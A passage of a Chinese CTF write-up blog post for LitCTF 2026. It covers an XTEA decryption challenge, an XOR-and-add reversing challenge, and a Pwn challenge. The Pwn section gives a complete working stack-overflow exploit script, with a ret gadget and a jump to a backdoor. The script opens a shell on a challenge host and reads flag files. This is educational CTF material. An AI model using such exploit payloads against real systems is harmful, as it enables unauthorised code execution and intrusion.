+<p>密文长度为 <code>0x20</code>，即 32 字节，说明一共是 4 个 XTEA block。</p>
+<h4 id="解密脚本-1"><a href="#解密脚本-1" class="headerlink" title="解密脚本"></a>解密脚本</h4><p>将下面脚本放到 <code>challenge.exe</code> 同目录下运行即可。<br>脚本会从 PE 文件中读取密文和 key，然后使用修改过 <code>delta</code> 的 XTEA 解密。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pathlib <span class="hljs-keyword">import</span> Path<br><span class="hljs-keyword">import</span> struct<br><br>MASK = <span class="hljs-number">0xFFFFFFFF</span><br>DELTA = <span class="hljs-number">0xDEADBEEF</span><br>ROUNDS = <span class="hljs-number">32</span><br><br>G_CIPHER_RVA = <span class="hljs-number">0x12040</span><br>G_KEY_RVA = <span class="hljs-number">0x12060</span><br>CIPHER_LEN = <span class="hljs-number">0x20</span><br>KEY_LEN = <span class="hljs-number">0x10</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_sections</span>(<span class="hljs-params">pe: <span class="hljs-built_in">bytes</span></span>):<br>    e_lfanew = struct.unpack_from(<span class="hljs-string">&quot;&lt;I&quot;</span>, pe, <span class="hljs-number">0x3C</span>)[<span class="hljs-number">0</span>]<br>    number_of_sections = struct.unpack_from(<span class="hljs-string">&quot;&lt;H&quot;</span>, pe, e_lfanew + <span class="hljs-number">6</span>)[<span class="hljs-number">0</span>]<br>    size_of_optional_header = struct.unpack_from(<span class="hljs-string">&quot;&lt;H&quot;</span>, pe, e_lfanew + <span class="hljs-number">20</span>)[<span class="hljs-number">0</span>]<br>    sec_off = e_lfanew + <span class="hljs-number">24</span> + size_of_optional_header<br><br>    sections = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(number_of_sections):<br>        off = sec_off + i * <span class="hljs-number">40</span><br>        name = pe[off:off + <span class="hljs-number">8</span>].split(<span class="hljs-string">b&quot;\0&quot;</span>, <span class="hljs-number">1</span>)[<span class="hljs-number">0</span>].decode(errors=<span class="hljs-string">&quot;ignore&quot;</span>)<br>        virtual_size, virtual_address, raw_size, raw_ptr = struct.unpack_from(<span class="hljs-string">&quot;&lt;IIII&quot;</span>, pe, off + <span class="hljs-number">8</span>)<br>        sections.append((name, virtual_address, <span class="hljs-built_in">max</span>(virtual_size, raw_size), raw_ptr))<br>    <span class="hljs-keyword">return</span> sections<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rva_to_file_offset</span>(<span class="hljs-params">sections, rva</span>):<br>    <span class="hljs-keyword">for</span> name, va, size, raw_ptr <span class="hljs-keyword">in</span> sections:<br>        <span class="hljs-keyword">if</span> va &lt;= rva &lt; va + size:<br>            <span class="hljs-keyword">return</span> raw_ptr + (rva - va)<br>    <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">f&quot;RVA 0x<span class="hljs-subst">&#123;rva:x&#125;</span> not found&quot;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">xtea_decrypt_block</span>(<span class="hljs-params">block, key_words</span>):<br>    v0, v1 = struct.unpack(<span class="hljs-string">&quot;&lt;2I&quot;</span>, block)<br>    s = (DELTA * ROUNDS) &amp; MASK<br><br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(ROUNDS):<br>        v1 = (v1 - (((((v0 &lt;&lt; <span class="hljs-number">4</span>) &amp; MASK) ^ (v0 &gt;&gt; <span class="hljs-number">5</span>)) + v0) &amp; MASK ^<br>                    ((s + key_words[(s &gt;&gt; <span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>]) &amp; MASK))) &amp; MASK<br>        s = (s - DELTA) &amp; MASK<br>        v0 = (v0 - (((((v1 &lt;&lt; <span class="hljs-number">4</span>) &amp; MASK) ^ (v1 &gt;&gt; <span class="hljs-number">5</span>)) + v1) &amp; MASK ^<br>                    ((s + key_words[s &amp; <span class="hljs-number">3</span>]) &amp; MASK))) &amp; MASK<br><br>    <span class="hljs-keyword">return</span> struct.pack(<span class="hljs-string">&quot;&lt;2I&quot;</span>, v0, v1)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">unpad_pkcs7</span>(<span class="hljs-params">data</span>):<br>    pad = data[-<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">if</span> pad &lt; <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> pad &gt; <span class="hljs-number">8</span> <span class="hljs-keyword">or</span> data[-pad:] != <span class="hljs-built_in">bytes</span>([pad]) * pad:<br>        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;bad padding&quot;</span>)<br>    <span class="hljs-keyword">return</span> data[:-pad]<br><br><br>pe = Path(<span class="hljs-string">&quot;challenge.exe&quot;</span>).read_bytes()<br>sections = parse_sections(pe)<br><br>cipher_off = rva_to_file_offset(sections, G_CIPHER_RVA)<br>key_off = rva_to_file_offset(sections, G_KEY_RVA)<br><br>cipher = pe[cipher_off:cipher_off + CIPHER_LEN]<br>key = pe[key_off:key_off + KEY_LEN]<br>key_words = <span class="hljs-built_in">list</span>(struct.unpack(<span class="hljs-string">&quot;&lt;4I&quot;</span>, key))<br><br>plain_padded = <span class="hljs-string">b&quot;&quot;</span>.join(<br>    xtea_decrypt_block(cipher[i:i + <span class="hljs-number">8</span>], key_words)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(cipher), <span class="hljs-number">8</span>)<br>)<br><br>flag = unpad_pkcs7(plain_padded)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] delta      =&quot;</span>, <span class="hljs-built_in">hex</span>(DELTA))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] key words  =&quot;</span>, [<span class="hljs-built_in">hex</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> key_words])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] cipher hex =&quot;</span>, cipher.<span class="hljs-built_in">hex</span>())<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] padded     =&quot;</span>, plain_padded)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] flag       =&quot;</span>, flag.decode())<br></code></pre></td></tr></table></figure>
+
+<h4 id="运行结果-7"><a href="#运行结果-7" class="headerlink" title="运行结果"></a>运行结果</h4><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">[+] delta      = 0xdeadbeef<br>[+] key words  = [&#x27;0x11111111&#x27;, &#x27;0x22222222&#x27;, &#x27;0x33333333&#x27;, &#x27;0x44444444&#x27;]<br>[+] cipher hex = e3ee1ee7d3a7966fc6a7b9e1b94e67865f0304a6dbbbb940563af79eee64d406<br>[+] padded     = b&#x27;LitCTF&#123;rev04_xtea_delta_twk!&#125;\x03\x03\x03&#x27;<br>[+] flag       = LitCTF&#123;rev04_xtea_delta_twk!&#125;<br></code></pre></td></tr></table></figure>
+
+<p>解密出的明文末尾是 <code>\x03\x03\x03</code>，符合 PKCS#7 填充规则，去掉填充后得到最终 flag。</p>
+<h4 id="Flag-6"><a href="#Flag-6" class="headerlink" title="Flag"></a>Flag</h4><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">LitCTF&#123;rev04_xtea_delta_twk!&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="LitCTF2026-lit-xor-chain"><a href="#LitCTF2026-lit-xor-chain" class="headerlink" title="[LitCTF2026] lit_xor_chain"></a>[LitCTF2026] lit_xor_chain</h3><h4 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h4><p>程序读入一行字符串，对每个字节依次执行：</p>
+<ol>
+<li>与固定常数异或；</li>
+<li>再加固定常数；</li>
+<li>与内存中的期望数组逐字节比较。</li>
+</ol>
+<p>整体逻辑属于常见的 <code>循环 + xor + add + 数组比对</code> 入门逆向题。</p>
+<h4 id="1-基本分析"><a href="#1-基本分析" class="headerlink" title="1. 基本分析"></a>1. 基本分析</h4><p>拿到附件后先解压，使用 IDA &#x2F; Ghidra 打开主程序，定位到 <code>main</code> 函数。</p>
+<p>在主逻辑中可以看到程序先判断输入长度：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asm">cmp    rax, 0x1e<br></code></pre></td></tr></table></figure>
+
+<p><code>0x1e = 30</code>，说明正确输入长度为 30 字节。</p>
+<p>随后进入循环，对输入的每个字符做变换后与期望数组比较，核心逻辑如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asm">xor    edx, 0x52<br>add    edx, 0x5<br>cmp    BYTE PTR [r8], dl<br></code></pre></td></tr></table></figure>
+
+<p>也就是：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">check[i] = (input[i] ^ <span class="hljs-number">0x52</span>) + <span class="hljs-number">0x05</span>;<br></code></pre></td></tr></table></figure>
+
+<p>然后与内存中的 <code>g_expected</code> 数组逐字节比较。</p>
+<h4 id="2-提取期望数组"><a href="#2-提取期望数组" class="headerlink" title="2. 提取期望数组"></a>2. 提取期望数组</h4><p>从程序中提取出的期望数组为：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">23 40 2b 16 0b 19 2e 25 3c 29 67 68 12 2f 42<br>25 12 2b 3f 3c 41 12 38 3b 3b 12 42 3e 78 34<br></code></pre></td></tr></table></figure>
+
+<p>数组长度正好是 30 字节，与前面的长度判断一致。</p>
+<h4 id="3-逆向还原"><a href="#3-逆向还原" class="headerlink" title="3. 逆向还原"></a>3. 逆向还原</h4><p>程序正向变换为：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">enc = ((plain ^ <span class="hljs-number">0x52</span>) + <span class="hljs-number">5</span>) &amp; <span class="hljs-number">0xff</span><br></code></pre></td></tr></table></figure>
+
+<p>因此逆向时先减去 <code>5</code>，再异或 <code>0x52</code>：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">plain = ((enc - <span class="hljs-number">5</span>) &amp; <span class="hljs-number">0xff</span>) ^ <span class="hljs-number">0x52</span><br></code></pre></td></tr></table></figure>
+
+<p>按照这个公式逐字节还原即可得到原始输入。</p>
+<h4 id="4-EXP"><a href="#4-EXP" class="headerlink" title="4. EXP"></a>4. EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">expected = <span class="hljs-built_in">bytes</span>.fromhex(<br>    <span class="hljs-string">&quot;23402b160b192e253c296768122f4225&quot;</span><br>    <span class="hljs-string">&quot;122b3f3c4112383b3b12423e7834&quot;</span><br>)<br><br>flag = <span class="hljs-built_in">bytes</span>(((b - <span class="hljs-number">5</span>) &amp; <span class="hljs-number">0xff</span>) ^ <span class="hljs-number">0x52</span> <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> expected)<br><br><span class="hljs-built_in">print</span>(flag.decode())<br><br>check = <span class="hljs-built_in">bytes</span>(((c ^ <span class="hljs-number">0x52</span>) + <span class="hljs-number">5</span>) &amp; <span class="hljs-number">0xff</span> <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> flag)<br><span class="hljs-built_in">print</span>(check.<span class="hljs-built_in">hex</span>())<br><span class="hljs-built_in">print</span>(check == expected)<br></code></pre></td></tr></table></figure>
+
+<p>运行结果：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">LitCTF&#123;rev01_xor_then_add_ok!&#125;<br>23402b160b192e253c296768122f4225122b3f3c4112383b3b12423e7834<br>True<br></code></pre></td></tr></table></figure>
+
+<p>可以看到还原出的字符串重新经过程序逻辑后，结果与期望数组完全一致。</p>
+<h4 id="5-Flag"><a href="#5-Flag" class="headerlink" title="5. Flag"></a>5. Flag</h4><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">LitCTF&#123;rev01_xor_then_add_ok!&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="LitCTF2026-lit-ret2libc"><a href="#LitCTF2026-lit-ret2libc" class="headerlink" title="[LitCTF2026] lit_ret2libc"></a>[LitCTF2026] lit_ret2libc</h3><h4 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h4><p>这题是一个很直接的栈溢出题，核心点在于 <code>read_data()</code> 里把有符号 <code>int size</code> 强转成了 <code>unsigned int</code> 传给 <code>read()</code>。输入 <code>-1</code> 后长度会变成一个超大的无符号数，从而覆盖返回地址，最后跳到隐藏的 <code>backdoor()</code> 拿到 shell 并读取 flag。</p>
+<h4 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h4><h5 id="Step-1-定位漏洞并确认利用点"><a href="#Step-1-定位漏洞并确认利用点" class="headerlink" title="Step 1: 定位漏洞并确认利用点"></a>Step 1: 定位漏洞并确认利用点</h5><p>附件里给了源码，关键逻辑如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> size;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;size);<br>read(<span class="hljs-number">0</span>, buf, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)size);<br></code></pre></td></tr></table></figure>
+
+<p>程序表面上检查了 <code>size</code> 是否在 <code>0-63</code> 范围内，但即使输入非法值也还是会继续执行 <code>read()</code>。因此当我们输入 <code>-1</code> 时，<code>read()</code> 的第三个参数会变成 <code>0xffffffff</code>，可以直接把 <code>buf[64]</code> 后面的栈内容一起覆盖掉。</p>
+<p>反汇编后可以确认：</p>
+<ul>
+<li>缓冲区起始位置在 <code>rbp-0x40</code></li>
+<li>返回地址偏移是 <code>72</code> 字节</li>
+<li><code>backdoor()</code> 地址是 <code>0x4011d7</code></li>
+</ul>
+<p>不过直接返回到 <code>backdoor()</code> 会因为栈对齐问题导致 <code>system(&quot;/bin/sh&quot;)</code> 不稳定，所以需要先补一个单独的 <code>ret</code>，也就是：</p>
+<ul>
+<li><code>ret = 0x4011ec</code></li>
+<li><code>backdoor = 0x4011d7</code></li>
+</ul>
+<h5 id="Step-2-构造-payload-并读取-flag"><a href="#Step-2-构造-payload-并读取-flag" class="headerlink" title="Step 2: 构造 payload 并读取 flag"></a>Step 2: 构造 payload 并读取 flag</h5><p>完整利用脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> time<br><br><br>HOST = <span class="hljs-string">&quot;challenge.cyclens.tech&quot;</span><br>PORT = <span class="hljs-number">32610</span><br><br>RET = <span class="hljs-number">0x4011EC</span><br>BACKDOOR = <span class="hljs-number">0x4011D7</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">emit</span>(<span class="hljs-params">data: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-literal">None</span>:<br>    sys.stdout.write(data.decode(<span class="hljs-string">&quot;utf-8&quot;</span>, errors=<span class="hljs-string">&quot;replace&quot;</span>))<br>    sys.stdout.flush()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">recv_quiet</span>(<span class="hljs-params">sock: socket.socket, quiet_seconds: <span class="hljs-built_in">float</span>, total_seconds: <span class="hljs-built_in">float</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    end = time.time() + total_seconds<br>    last_data = time.time()<br>    data = <span class="hljs-built_in">bytearray</span>()<br>    sock.setblocking(<span class="hljs-literal">False</span>)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">while</span> time.time() &lt; end:<br>            <span class="hljs-keyword">try</span>:<br>                chunk = sock.recv(<span class="hljs-number">4096</span>)<br>                <span class="hljs-keyword">if</span> chunk:<br>                    data.extend(chunk)<br>                    last_data = time.time()<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">except</span> BlockingIOError:<br>                <span class="hljs-keyword">pass</span><br>            <span class="hljs-keyword">if</span> data <span class="hljs-keyword">and</span> time.time() - last_data &gt;= quiet_seconds:<br>                <span class="hljs-keyword">break</span><br>            time.sleep(<span class="hljs-number">0.05</span>)<br>    <span class="hljs-keyword">finally</span>:<br>        sock.setblocking(<span class="hljs-literal">True</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(data)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>() -&gt; <span class="hljs-built_in">int</span>:<br>    payload = <span class="hljs-string">b&quot;-1\n&quot;</span> + <span class="hljs-string">b&quot;A&quot;</span> * <span class="hljs-number">72</span> + struct.pack(<span class="hljs-string">&quot;&lt;Q&quot;</span>, RET) + struct.pack(<span class="hljs-string">&quot;&lt;Q&quot;</span>, BACKDOOR)<br>    command = <span class="hljs-string">b&quot;cat /flag* 2&gt;/dev/null; cat /home/*/flag* 2&gt;/dev/null; exit\n&quot;</span><br><br>    <span class="hljs-keyword">with</span> socket.create_connection((HOST, PORT), timeout=<span class="hljs-number">5</span>) <span class="hljs-keyword">as</span> sock:<br>        time.sleep(<span class="hljs-number">0.3</span>)<br>        sock.sendall(payload)<br>        banner = recv_quiet(sock, quiet_seconds=<span class="hljs-number">2.0</span>, total_seconds=<span class="hljs-number">5.0</span>)<br>        <span class="hljs-keyword">if</span> banner:<br>            emit(banner)<br><br>        sock.sendall(command)<br>        output = recv_quiet(sock, quiet_seconds=<span class="hljs-number">2.0</span>, total_seconds=<span class="hljs-number">6.0</span>)<br>        <span class="hljs-keyword">if</span> output:<br>            emit(output)<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-keyword">raise</span> SystemExit(main())<br></code></pre></td></tr></table></figure>
+
+<p>运行后可以得到：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">Welcome to the Integer Labyrinth!<br>Can you find the hidden backdoor?<br>How many bytes do you want to read? (0-63): Invalid size! But I&#x27;ll still read it anyway...<br>flag&#123;mdvpill4-kxrt-4sz-80z5-4trujrtr50qxw&#125;<br></code></pre></td></tr></table></figure>
+
+<h4 id="Flag-7"><a href="#Flag-7" class="headerlink" title="Flag"></a>Flag</h4><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">flag&#123;mdvpill4-kxrt-4sz-80z5-4trujrtr50qxw&#125;<br></code></pre></td></tr></table></figure>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Writeup/" class="category-chain-item">Writeup</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/CTF/" class="print-no-link">#CTF</a>
+      
+        <a href="/tags/LitCTF/" class="print-no-link">#LitCTF</a>
+      
+        <a href="/tags/Crypto/" class="print-no-link">#Crypto</a>
+      
+        <a href="/tags/Reverse/" class="print-no-link">#Reverse</a>
+      
+        <a href="/tags/Pwn/" class="print-no-link">#Pwn</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>LitCTF 2026 题解合集</div>
+      <div>https://b3nk-x1.github.io/posts/litctf-2026-writeups/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>b3nk</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年6月20日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/posts/%E7%9B%98%E5%8F%A4%E7%9F%B3WP(%E7%89%A9%E8%81%94+%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%8F%96%E8%AF%81)/" title="盘古石WP（物联 + 计算机取证）">
+                        <span class="hidden-mobile">盘古石WP（物联 + 计算机取证）</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <span>b3nk's Blog</span> <span class="footer-sep">·</span> <span>CTF / 网安学习记录</span> <span class="footer-sep">·</span> <a href="https://github.com/b3nk-x1" target="_blank" rel="nofollow noopener">GitHub</a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":120})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    function isExpandAllEnabled() {
+      return CONFIG.toc && CONFIG.toc.expand_all === true;
+    }
+    function expandAllToc() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .tocbot-is-collapsed').removeClass('tocbot-is-collapsed');
+    }
+    function updateTocToggle($li, $childList) {
+      var $toggle = $li.children('.toc-toggle');
+      if ($toggle.length === 0) { return; }
+      var collapsed = $childList.hasClass('tocbot-is-collapsed');
+      $toggle
+        .toggleClass('toc-toggle-collapsed', collapsed)
+        .toggleClass('toc-toggle-expanded', !collapsed);
+    }
+    function bindTocToggle() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .toc-list-item').each(function() {
+        var $li = jQuery(this);
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) {
+          if ($li.children('.toc-toggle').length === 0) {
+            $li.prepend('<span class="toc-toggle toc-toggle-placeholder" aria-hidden="true">›</span>');
+          }
+          return;
+        }
+
+        if ($li.children('.toc-toggle').length === 0) {
+          $li.prepend('<span class="toc-toggle toc-toggle-expanded" aria-hidden="true">›</span>');
+        }
+        updateTocToggle($li, $childList);
+      });
+      jQuery('#toc-body').off('click.tocToggle').on('click.tocToggle', '.toc-toggle', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        var $li = jQuery(this).parent('.toc-list-item');
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) { return; }
